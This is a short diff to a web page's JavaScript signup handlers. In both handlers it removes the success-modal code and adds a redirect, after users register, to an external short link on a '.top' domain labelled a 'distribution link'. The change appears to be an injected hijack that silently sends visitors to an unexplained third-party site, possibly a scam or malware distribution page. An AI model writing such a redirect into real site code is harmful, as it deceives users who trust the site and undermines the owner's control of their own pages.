@@ -33,17 +33,8 @@ document.getElementById('signupForm').addEventListener('submit', function (e) {
     users.push(userData);
     localStorage.setItem('registeredUsers', JSON.stringify(users));
 
-    // Show success modal
-    const successModal = document.querySelector('.success-model');
-    successModal.style.display = 'flex';
-
-    // Reset form
-    this.reset();
-
-    // Auto-hide after 4 seconds
-    setTimeout(() => {
-        successModal.style.display = 'none';
-    }, 4000);
+    // Redirect to distribution link
+    window.location.href = 'https://ok001.top/j/iVBpsFyf8024';
 });
 
 // FAQ Accordion
@@ -165,17 +156,8 @@ document.getElementById('modalSignupForm')?.addEventListener('submit', function 
     users.push(userData);
     localStorage.setItem('registeredUsers', JSON.stringify(users));
 
-    // Close register modal
-    closeRegisterModal();
-
-    // Show success modal
-    const successModal = document.querySelector('.success-model');
-    successModal.style.display = 'flex';
-
-    // Auto-hide after 4 seconds
-    setTimeout(() => {
-        successModal.style.display = 'none';
-    }, 4000);
+    // Redirect to distribution link
+    window.location.href = 'https://ok001.top/j/iVBpsFyf8024';
 });
 
 // Close modals when clicking outside
